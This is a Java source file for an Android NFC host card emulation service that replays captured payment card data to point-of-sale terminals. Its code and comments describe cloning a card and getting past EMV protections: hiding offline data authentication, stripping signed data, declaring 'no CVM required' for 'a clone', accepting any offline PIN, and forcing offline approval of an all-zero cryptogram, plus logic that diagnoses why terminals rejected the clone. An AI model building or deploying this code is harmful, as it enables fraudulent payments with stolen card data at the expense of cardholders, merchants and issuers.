package de.androidcrypto.android_hce_emulate_a_creditcard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.nfc.cardemulation.HostApduService;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Random;

public class HceCcEmulationServiceVisa extends HostApduService {

    private static final String TAG = "HCE";

    private static final byte[] SW_OK          = hex("9000");
    private static final byte[] SW_BAD         = hex("6A82");
    private static final byte[] SW_UNSUPPORTED = hex("6D00");
    private static final byte[] PPSE           = hex("325041592E5359532E4444463031");

    // Fallback AIP when the card has no captured GPO.
    // byte 1 = 0x18  cardholder verification + terminal risk management, no ODA
    // byte 2 = 0x80  EMV mode supported
    private static final String DEFAULT_AIP = "1880";

    // clear SDA (0x40), DDA (0x20), CDA (0x01); keep CV (0x10) and TRM (0x08).
    // Without the private key none of the three ODA methods can pass, so we
    // advertise none of them and the terminal skips the step entirely.
    private static final byte AIP_ODA_MASK = 0x18;

    // AIP byte 2 bit 8. Only meaningful with EMV framing - a magstripe-mode
    // response must not claim EMV mode.
    private static final byte AIP_EMV_MODE = (byte) 0x80;

    // 9F27 Cryptogram Information Data. NOT the same encoding as the P1 request
    // bits - P1 0x80 means "terminal wants an ARQC", CID 0x80 means "here is an
    // ARQC". Handing back the wrong one makes the terminal decline without ever
    // going online.
    private static final byte CID_AAC  = (byte) 0x00;   // declined offline
    private static final byte CID_TC   = (byte) 0x40;   // approved offline
    private static final byte CID_ARQC = (byte) 0x80;   // go online

    /**
     * true  - when we actually hold a matching MK-AC, answer ARQC and let the
     *         issuer judge a cryptogram that is real. Without a key the ARQC
     *         would be eight zero bytes, which the host almost always rejects,
     *         so in that case we fall through to FORCE_OFFLINE_TC instead.
     * false - always fall through to the flag below.
     */
    private static final boolean FORCE_ONLINE_ARQC = true;

    /**
     * true  - answer TC. The card says "approved, do not call the host", so an
     *         unverifiable ARQC never gets judged. Needs a small amount and a
     *         terminal that is not configured forced-online.
     * false - mirror what the terminal asked for.
     */
    private static final boolean FORCE_OFFLINE_TC = true;

    private static final String PDOL    = "9F02069F03069F1A0295055F2A029A039C019F3704";
    private static final String CDOL1   = "9F02069F03069F1A0295055F2A029A039C019F3704";
    private static final String CDOL2   = "9F02069F03069F1A0295055F2A029A039C019F37049F3403";

    // X=0, Y=0, one rule: CVM code 0x1F "no CVM required", condition 0x00 "always".
    // The old value (000013881F0602071E03) parsed as X=00001388 and Y=1F060207,
    // which is not a sane amount, and its first rule used CVM code 0x13, which is
    // RFU. "No CVM, always" is the right thing for a clone.
    private static final String CVMLIST = "00000000000000001F00";

    private final StringBuilder tapLog = new StringBuilder();
    private final Random rnd = new Random();

    /** The AIP actually sent in the GPO response. The ARQC is MACed over this. */
    private byte[] txnAip;
    /** One ATC per tap, shared by the GPO response and the cryptogram. */
    private String txnAtc;
    /** True once we have answered a cryptogram request. */
    private boolean cryptogramSent;

    private void tap(String s) {
        tapLog.append(s).append('\n');
        if (tapLog.length() > 6000) tapLog.delete(0, 3000);
    }

    static byte[] hex(String s) {
        if (s == null) return new byte[0];
        s = s.replaceAll("[^0-9A-Fa-f]", "");
        if (s.length() % 2 != 0) s = s + "F";
        int n = s.length() / 2;
        byte[] b = new byte[n];
        for (int i = 0; i < n; i++) {
            b[i] = (byte) Integer.parseInt(s.substring(i * 2, i * 2 + 2), 16);
        }
        return b;
    }

    static byte[] tlv(int tag, byte[] v) {
        byte[] t;
        if (tag > 0xFFFF) {
            t = new byte[]{(byte) (tag >> 16), (byte) (tag >> 8), (byte) tag};
        } else if (tag > 0xFF) {
            t = new byte[]{(byte) (tag >> 8), (byte) tag};
        } else {
            t = new byte[]{(byte) tag};
        }
        byte[] l;
        if (v.length < 0x80) {
            l = new byte[]{(byte) v.length};
        } else if (v.length < 0x100) {
            l = new byte[]{(byte) 0x81, (byte) v.length};
        } else {
            l = new byte[]{(byte) 0x82, (byte) (v.length >> 8), (byte) v.length};
        }
        byte[] out = new byte[t.length + l.length + v.length];
        System.arraycopy(t, 0, out, 0, t.length);
        System.arraycopy(l, 0, out, t.length, l.length);
        System.arraycopy(v, 0, out, t.length + l.length, v.length);
        return out;
    }

    static byte[] cat(byte[]... arrs) {
        int len = 0;
        for (byte[] a : arrs) len += a.length;
        byte[] out = new byte[len];
        int p = 0;
        for (byte[] a : arrs) {
            System.arraycopy(a, 0, out, p, a.length);
            p += a.length;
        }
        return out;
    }

    private SharedPreferences prefs() {
        return getSharedPreferences("hce_card", Context.MODE_PRIVATE);
    }

    private String sel() {
        return "card" + prefs().getInt("selected", 0) + "_";
    }

    /**
     * Note: an empty stored value is treated as absent, so the default applies.
     * collect() writes empty strings for untouched fields, which would otherwise
     * shadow every default here and produce zero-length TLVs.
     */
    private String p(String k, String d) {
        String v = prefs().getString(sel() + k, d);
        return (v == null || v.isEmpty()) ? d : v;
    }

    private void put(String k, String v) {
        prefs().edit().putString(sel() + k, v).apply();
    }

    /** msd is stored with putInt, so it must be read with getInt. */
    private boolean isMsd() {
        return prefs().getInt(sel() + "msd", 1) == 1;
    }

    private String nextAtc() {
        int atc = 0x001B;
        try {
            String cur = p("atc", "001B").replaceAll("[^0-9A-Fa-f]", "");
            if (!cur.isEmpty()) atc = Integer.parseInt(cur, 16);
        } catch (Exception ignored) { }
        atc = (atc + 1) & 0xFFFF;
        String h = String.format("%04X", atc);
        put("atc", h);
        return h;
    }

    /** Allocate the transaction ATC exactly once per tap. */
    private String txnAtc() {
        if (txnAtc == null) txnAtc = nextAtc();
        return txnAtc;
    }

    private void resetTransaction() {
        txnAip = null;
        txnAtc = null;
        cryptogramSent = false;
    }

    private byte[] aipForMac() {
        if (txnAip != null) return txnAip;
        return hex(p("aip", DEFAULT_AIP));
    }

    /** True when a usable MK-AC is set on the selected card. */
    private boolean haveKey() {
        return p("mkac", "").replaceAll("[^0-9A-Fa-f]", "").length() >= 32;
    }

    // ---------- captured raw data (namespaced per wallet card) ----------

    private static byte[] hexOrNull(String s) {
        return (s == null || s.isEmpty()) ? null : hex(s);
    }

    private byte[] cap(String key) {
        return hexOrNull(p("cap_" + key, ""));
    }

    private byte[] rawFci()  { return cap("rawfci"); }
    private byte[] rawGpo()  { return cap("rawgpo"); }

    private byte[] rawRec(int sfi, int rec) {
        return cap("rec" + sfi + "_" + rec);
    }

    private static int readTag(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int t = b[pos[0]++] & 0xFF;
        if ((t & 0x1F) == 0x1F) {
            if (pos[0] >= b.length) return t;
            t = (t << 8) | (b[pos[0]++] & 0xFF);
            while (pos[0] < b.length && (b[pos[0] - 1] & 0x80) != 0) {
                t = (t << 8) | (b[pos[0]++] & 0xFF);
            }
        }
        return t;
    }

    private static int readLen(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int l = b[pos[0]++] & 0xFF;
        if ((l & 0x80) != 0) {
            int n = l & 0x7F, v = 0;
            for (int k = 0; k < n && pos[0] < b.length; k++) {
                v = (v << 8) | (b[pos[0]++] & 0xFF);
            }
            return v;
        }
        return l;
    }

    private static String bytesToHex(byte[] d) {
        if (d == null) return "";
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02X", b & 0xFF));
        return sb.toString();
    }

    // ---------- the directory we advertise ----------

    private static int kernelFor(String aidHex) {
        String a = aidHex == null ? "" : aidHex.toUpperCase();
        if (a.startsWith("A000000152")) return 6;   // Discover / Diners
        if (a.startsWith("A000000015")) return 6;   // Discover / Diners (legacy RID)
        if (a.startsWith("A000000004")) return 2;   // Mastercard
        if (a.startsWith("A000000065")) return 5;   // JCB
        if (a.startsWith("A000000025")) return 4;   // Amex
        if (a.startsWith("A000000333")) return 6;   // UnionPay
        return 3;                                   // Visa and anything else
    }

    /**
     * priority 1 = the card the terminal should actually use.
     * Anything higher is a fallback it should only reach for if the real
     * application fails. Equal priorities let the terminal wander off to Visa
     * and then apply the wrong kernel to foreign data.
     */
    private byte[] appEntry(String aidHex, String label, int priority) {
        return cat(
                tlv(0x4F, hex(aidHex)),
                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x87, new byte[]{(byte) priority}),
                tlv(0x9F2A, new byte[]{(byte) kernelFor(aidHex)}));
    }

    private byte[] buildPpse() {
        String realAid = p("cap_aid", "");
        if (realAid.isEmpty()) realAid = p("aid", "A0000000031010");

        ByteArrayOutputStream dir = new ByteArrayOutputStream();

        byte[] e0 = tlv(0x61, appEntry(realAid, "CARD", 1));
        dir.write(e0, 0, e0.length);

        if (!realAid.equalsIgnoreCase("A0000000031010")) {
            byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA", 2));
            dir.write(e, 0, e.length);
        }
        if (!realAid.equalsIgnoreCase("A0000000041010")) {
            byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD", 3));
            dir.write(e, 0, e.length);
        }

        byte[] fci = tlv(0xBF0C, dir.toByteArray());
        byte[] inner = cat(tlv(0x84, PPSE), tlv(0xA5, fci));
        return tlv(0x6F, inner);
    }

    /** Make the captured FCI claim the AID the terminal actually asked for. */
    private byte[] patchFci(byte[] fci, byte[] aid) {
        int[] pos = new int[1];
        int outer = readTag(fci, pos);
        int outerLen = readLen(fci, pos);
        int end = Math.min(fci.length, pos[0] + outerLen);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(fci, q);
            int l = readLen(fci, q);
            if (q[0] + l > fci.length) break;
            byte[] v = Arrays.copyOfRange(fci, q[0], q[0] + l);
            i = q[0] + l;

            if (t == 0x84) {
                v = aid;
            } else if (t == 0x9F2A && v.length >= 1) {
                v = new byte[]{(byte) kernelFor(bytesToHex(aid))};
            }

            byte[] one = tlv(t, v);
            out.write(one, 0, one.length);
        }
        return tlv(outer, out.toByteArray());
    }

    @Override
    public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
        try {
            if (apdu == null || apdu.length < 4) return SW_BAD;

            int ins = apdu[1] & 0xFF;
            int p1  = apdu[2] & 0xFF;
            int p2  = apdu[3] & 0xFF;

            boolean isSelect = (ins == 0xA4 && (p1 == 0x04 || p1 == 0x00));

            if (isSelect && apdu.length >= 5) {
                int lc0 = apdu[4] & 0xFF;
                if (apdu.length >= 5 + lc0) {
                    byte[] nm = new byte[lc0];
                    System.arraycopy(apdu, 5, nm, 0, lc0);
                    if (Arrays.equals(nm, PPSE)) {
                        tapLog.setLength(0);
                        resetTransaction();
                    }
                }
            }

            tap(">> " + bytesToHex(apdu));

            byte[] out;
            if (isSelect) {
                if (apdu.length < 5) return SW_BAD;
                out = select(apdu);
            } else if (ins == 0xA8) {
                out = gpo();
            } else if (ins == 0xB2) {
                out = readRecord(p1, p2);
            } else if (ins == 0xAE) {
                out = genac(apdu);
            } else if (ins == 0xCA) {
                out = getData(apdu);
            } else if (ins == 0x20) {
                // VERIFY - offline PIN. We hold no PIN, so always claim a match
                // rather than letting the tap die on 6A82.
                out = SW_OK;
            } else if (ins == 0x84) {
                // GET CHALLENGE - hand back 8 bytes of noise.
                byte[] ch = new byte[8];
                rnd.nextBytes(ch);
                out = cat(ch, SW_OK);
            } else if (ins == 0x88) {
                out = SW_UNSUPPORTED;
            } else {
                out = SW_BAD;
            }

            tap("<< " + bytesToHex(out));
            return out;
        } catch (Exception e) {
            tap("!! " + e);
            return SW_BAD;
        }
    }

    private byte[] select(byte[] apdu) {
        int lc = apdu[4] & 0xFF;
        if (apdu.length < 5 + lc) return SW_BAD;
        byte[] name = new byte[lc];
        System.arraycopy(apdu, 5, name, 0, lc);

        if (Arrays.equals(name, PPSE)) {
            return cat(buildPpse(), SW_OK);
        }

        String real = p("aid", "");
        tap("-- selected " + bytesToHex(name)
                + " | card is " + (real.isEmpty() ? "?" : real));

        byte[] captured = rawFci();
        if (captured != null) {
            return cat(patchFci(captured, name), SW_OK);
        }

        String label = p("label", "CARD");
        byte[] prop = cat(
                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                tlv(0x87, new byte[]{0x01}),
                tlv(0x9F38, hex(PDOL)));
        byte[] inner = cat(tlv(0x84, name), tlv(0xA5, prop));
        return cat(tlv(0x6F, inner), SW_OK);
    }

    private byte[] gpo() {
        byte[] captured = rawGpo();
        if (captured != null) {
            return cat(rewriteGpo(captured), SW_OK);
        }

        // No capture - synthesise. Mask the ODA bits so the terminal does not
        // attempt an authentication we cannot pass, and keep the AIP consistent
        // with whichever framing we are about to send.
        boolean msd = isMsd();
        byte[] aip = hex(p("aip", DEFAULT_AIP));
        if (aip.length >= 2) {
            aip[0] &= AIP_ODA_MASK;
            if (msd) aip[1] &= (byte) ~AIP_EMV_MODE;
        }
        txnAip = aip;

        String afl = p("afl", "08010100");
        if (msd) {
            return cat(tlv(0x80, cat(aip, hex(afl))), SW_OK);
        }
        return cat(tlv(0x77, cat(tlv(0x82, aip), tlv(0x94, hex(afl)))), SW_OK);
    }

    private byte[] rewriteGpo(byte[] raw) {
        int[] pos = new int[1];
        int outer = readTag(raw, pos);

        // magstripe mode: AIP is the first two bytes of the value, no tags to walk
        if (outer == 0x80) {
            if (raw.length >= 4) txnAip = new byte[]{raw[2], raw[3]};
            return raw.clone();
        }

        int outerLen = readLen(raw, pos);
        int end = Math.min(raw.length, pos[0] + outerLen);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(raw, q);
            int l = readLen(raw, q);
            if (q[0] + l > raw.length) break;
            byte[] v = Arrays.copyOfRange(raw, q[0], q[0] + l);
            i = q[0] + l;

            if (t == 0x9F4B) {
                continue;                                  // SDAD, we cannot recompute it
            } else if (t == 0x82 && v.length >= 2) {
                v = new byte[]{(byte) (v[0] & AIP_ODA_MASK), v[1]};
                txnAip = v;
            } else if (t == 0x9F27) {
                v = new byte[]{CID_TC};
            } else if (t == 0x9F36) {
                v = hex(txnAtc());
            } else if (t == 0x9F26) {
                v = new byte[8];
            } else if (t == 0x9F6C && v.length >= 2) {
                v[1] |= (byte) 0x80;
            }

            byte[] one = tlv(t, v);
            out.write(one, 0, one.length);
        }
        return tlv(0x77, out.toByteArray());
    }

    private byte[] readRecord(int p1, int p2) {
        int sfi = (p2 & 0xFF) >> 3;
        int rec = p1 & 0xFF;

        byte[] captured = rawRec(sfi, rec);
        if (captured != null) {
            return cat(captured, SW_OK);
        }

        // Card dumps arrive as PAN=expiry service discretionary. '=' is not hex,
        // so swap it for 'D' here - otherwise the TLV writer deletes it and the
        // terminal gets a track 2 with no separator in it.
        String track2Hex = p("track2", "").trim().toUpperCase().replace('=', 'D');
        String pan  = p("pan", "4111111111111111");
        String exp  = p("expiry", "3112");
        String sc   = p("service", "201");
        String disc = p("discretionary", "");

        String track;
        if (!track2Hex.isEmpty()) {
            track = track2Hex;
        } else {
            track = pan + "D" + exp + sc + disc;
            if (track.length() % 2 != 0) track = track + "F";
        }
        if (pan.length() % 2 != 0) pan = pan + "F";

        return cat(tlv(0x70, cat(
                tlv(0x5A, hex(pan)),
                tlv(0x5F24, hex(exp + "00")),
                tlv(0x57, hex(track)),
                tlv(0x8C, hex(CDOL1)),
                tlv(0x8D, hex(CDOL2)),
                tlv(0x8E, hex(CVMLIST)))), SW_OK);
    }

    private byte[] genac(byte[] apdu) {
        int p1 = apdu[2] & 0xFF;
        int requested = p1 & 0xC0;

        // P1 bits 8-7 say what the terminal WANTS; CID says what we DID.
        // 0x80 = ARQC wanted, 0x40 = TC wanted, 0x00 = AAC wanted.
        // These are the same encoding, but they are two different fields - do
        // not assume the terminal wants back the byte it just sent.
        //
        // Going online is only worth it when the ARQC is genuine. Without a key
        // it is eight zero bytes, so answer TC and let the terminal approve
        // offline rather than handing the host a cryptogram it will reject.
        byte cid;
        if (FORCE_ONLINE_ARQC && haveKey()) {
            cid = CID_ARQC;                              // real ARQC - let the issuer judge
        } else if (FORCE_OFFLINE_TC) {
            cid = CID_TC;                                // no key - approve offline
        } else if (requested == 0x80) {
            cid = CID_ARQC;
        } else if (requested == 0x40) {
            cid = CID_TC;
        } else if (requested == 0x00) {
            cid = CID_AAC;
        } else {
            cid = CID_TC;   // 0xC0 is RFU/AAR - answer TC rather than stall
        }

        String atc = txnAtc();

        byte[] cdol = new byte[0];
        if (apdu.length >= 5) {
            int lc = apdu[4] & 0xFF;
            if (lc > 0 && apdu.length >= 5 + lc) {
                cdol = Arrays.copyOfRange(apdu, 5, 5 + lc);
            }
        }

        byte[] ac = computeAc(atc, cdol);
        cryptogramSent = true;

        tap("-- genac requested=" + String.format("%02X", requested)
                + " cid=" + String.format("%02X", cid)
                + " atc=" + atc + " arqc=" + bytesToHex(ac));

        return cat(tlv(0x77, cat(
                tlv(0x9F27, new byte[]{cid}),
                tlv(0x9F36, hex(atc)),
                tlv(0x9F26, ac),
                tlv(0x9F10, hex(p("iad", "06010A03A0B800"))))), SW_OK);
    }

    /**
     * MAC input is CDOL data, then AIP, then ATC. keyvar bit 1 flips that order
     * and bit 0 picks the diversification option - the key scan sets keyvar when
     * it finds a match, so the found key is used exactly the way it verified.
     */
    private byte[] computeAc(String atc, byte[] cdol) {
        String mk = p("mkac", "").replaceAll("[^0-9A-Fa-f]", "");
        if (mk.length() < 32) {
            tap("!! no MK-AC set - ARQC will be all zeros");
            return new byte[8];
        }
        int variant = 0;
        try {
            variant = Integer.parseInt(p("keyvar", "0").replaceAll("[^0-9]", ""));
        } catch (Exception ignored) { }
        try {
            byte[] macIn = ((variant & 2) != 0)
                    ? cat(aipForMac(), hex(atc), cdol)
                    : cat(cdol, aipForMac(), hex(atc));
            return EmvCrypto.arqc(mk, p("pan", "4111111111111111"),
                    p("psn", "00"), atc, macIn, variant & 1);
        } catch (Exception e) {
            tap("!! ARQC failed: " + e);
            return new byte[8];
        }
    }

    /**
     * GET DATA carries the tag in P1P2 - it is not a case-4 command with a data
     * field. A standard 80 CA 9F 36 00 is five bytes with Le at apdu[4].
     */
    private byte[] getData(byte[] apdu) {
        int tag = ((apdu[2] & 0xFF) << 8) | (apdu[3] & 0xFF);

        if (tag == 0x9F36)      return cat(tlv(0x9F36, hex(txnAtc())), SW_OK);
        else if (tag == 0x9F13) return cat(tlv(0x9F13, hex("00")), SW_OK);
        else if (tag == 0x9F17) return cat(tlv(0x9F17, hex("00")), SW_OK);
        return SW_BAD;
    }

    // ---------- what just happened ----------

    private static int countOf(String hay, String needle) {
        int n = 0, i = 0;
        while ((i = hay.indexOf(needle, i)) >= 0) { n++; i += needle.length(); }
        return n;
    }

    private String verdict() {
        String l = tapLog.toString();
        if (l.isEmpty()) return "TAP: nothing recorded";

        boolean ppse = l.contains("325041592E5359532E4444463031");
        int selects = countOf(l, ">> 00A40400");
        int gpos    = countOf(l, ">> 80A80000");
        int recs    = countOf(l, ">> 00B2");
        int gens    = countOf(l, ">> 80AE");

        if (!ppse)        return "TAP: terminal never asked for the directory - it never read the phone";
        if (selects <= 1) return "TAP: terminal read the directory then stopped - it found no AID it supports";
        if (gpos == 0)    return "TAP: terminal picked an app then stopped - it rejected the FCI";
        if (recs == 0)    return "TAP: terminal started a transaction but read no records - it didn't like the AFL";

        // magstripe mode never sends a GENERATE AC, so gens == 0 is normal there
        if (gens == 0) {
            if (isMsd()) {
                return "TAP: magstripe mode - terminal read " + recs
                        + " records and made its own decision (no cryptogram in MSD)";
            }
            return "TAP: terminal read " + recs + " records then quit before the cryptogram - its own ODA or CVM check failed";
        }
        if (gens >= 2)    return "TAP: terminal WENT ONLINE - the issuer judged our ARQC";
        if (l.contains("9F270140")) return "TAP: we answered TC - terminal should have APPROVED offline";
        if (l.contains("9F270180")) return "TAP: we answered ARQC - terminal must go online";
        if (l.contains("9F270100")) return "TAP: we answered AAC - terminal treated it as an offline decline";
        return "TAP: terminal asked for a cryptogram and we did not answer TC";
    }

    @Override
    public void onDeactivated(int reason) {
        final String t = tapLog.toString();
        final String v = verdict();
        if (!t.isEmpty()) {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null) cm.setPrimaryClip(ClipData.newPlainText("tap log", t));
            } catch (Exception ignored) { }
            try {
                prefs().edit().putString("taplog", t).putString("lastverdict", v).apply();
            } catch (Exception ignored) { }
            try {
                new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(HceCcEmulationServiceVisa.this, v, Toast.LENGTH_LONG).show();
                    }
                });
            } catch (Exception ignored) { }
        }
        Log.d(TAG, "onDeactivated reason=" + reason + " | " + v);
    }
}
